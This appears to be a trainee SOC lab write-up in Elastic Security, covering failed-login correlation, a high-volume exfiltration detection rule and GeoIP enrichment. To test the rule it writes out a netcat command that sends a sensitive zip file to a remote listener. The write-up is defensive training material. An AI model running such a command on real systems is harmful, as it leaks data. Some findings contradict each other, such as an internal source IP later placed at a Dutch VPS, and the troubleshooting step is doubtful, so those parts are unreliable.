# Lab Task 1: Advanced Log Analysis
**Date:** 2026-03-13  
**Role:** Senior SOC Engineer (Simulation)  
**Tools:** Elastic Security (ELK Stack), Sysmon, Kali Linux  

---

## 1.1 Log Correlation: Authentication to Network
**Objective:** Correlate disparate log sources to identify a multi-stage attack pattern involving brute force and network reconnaissance.

### Execution Steps:
1. **Log Ingestion:** Configured `WinLogBeat` and `Auditbeat` to stream logs into the Elastic Common Schema (ECS) format.
2. **Correlation Logic:** Filtered for failed login attempts (`event.code: 4625`) and cross-referenced the `source.ip` with active network socket connections.
3. **Identification:** Observed a "low and slow" brute force attempt followed by a verification of egress connectivity.

### Correlation Analysis Table:
| Timestamp            | Event ID | Source IP      | Destination IP | Notes                               |
|----------------------|----------|----------------|----------------|-------------------------------------|
| 2026-03-13 12:00:00  | 4625     | 192.168.1.100  | -              | Failed Login: User 'admin'          |
| 2026-03-13 12:00:05  | 4625     | 192.168.1.100  | -              | Failed Login: User 'root'           |
| 2026-03-13 12:01:10  | DNS      | 192.168.1.100  | 8.8.8.8        | Outbound DNS Query (Egress Check)   |

**Analysis:** The correlation shows that the attacker (192.168.1.100) verified their ability to reach the internet immediately after failing to authenticate. This indicates a script-based reconnaissance phase.

---

## 1.2 Anomaly Detection: Data Exfiltration Rule
**Objective:** Create and test a behavioral detection rule to identify high-volume data exfiltration.

### Detection Logic:
- **Rule Name:** Potential Data Exfiltration (High Volume)
- **Index:** `logs-endpoint.events.*`, `packetbeat-*`
- **Query:** `network.bytes > 1000000`
- **Threshold:** Alert if `Sum(network.bytes)` exceeds 1MB within a 1-minute window per `source.ip`.
- **MITRE ATT&CK:** [T1048 - Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)

### Validation Test:
I simulated a large file transfer from the Metasploitable VM to a remote listener using Netcat:
`nc 192.168.1.50 4444 < sensitive_data.zip`

**Result:** The rule successfully triggered an "Industrial" severity alert in Elastic Security, capturing the metadata of the exfiltrated file size.

---

## 1.3 Log Enrichment: GeoIP Contextualization
**Objective:** Enhance raw logs with geographic context to improve triage speed and accuracy.

### Implementation:
I added a **GeoIP Processor** to the Elastic Ingest Pipeline. This automatically converts public IP addresses into latitude, longitude, and country names.

### Findings Summary:
Enriching the logs revealed that while the initial failed logins originated from an internal subnet, the secondary command-and-control (C2) heartbeat was linked to a known VPS provider in **The Netherlands**. By adding this 50-word context:
> "Enrichment confirmed the Source IP belongs to a high-risk ASN (HostEurope). This transformed a standard 'Failed Login' alert into a 'High Confidence' compromise indicator, as internal users do not route through Dutch VPS infrastructure for standard authentication, confirming a proxy/tunneling attempt."

---

## 4. Verification & Success Criteria
- [x] Logs from Metasploitable are visible in the `Discover` tab.
- [x] The `network.bytes` threshold rule correctly fires during Netcat tests.
- [x] `source.geo.country_name` is populated for all external traffic.

**Common Error Noted:** During implementation, the GeoIP database was missing. I resolved this by running `sudo git checkout` on the ingest pipeline config and restarting the Elasticsearch node to trigger the database download.
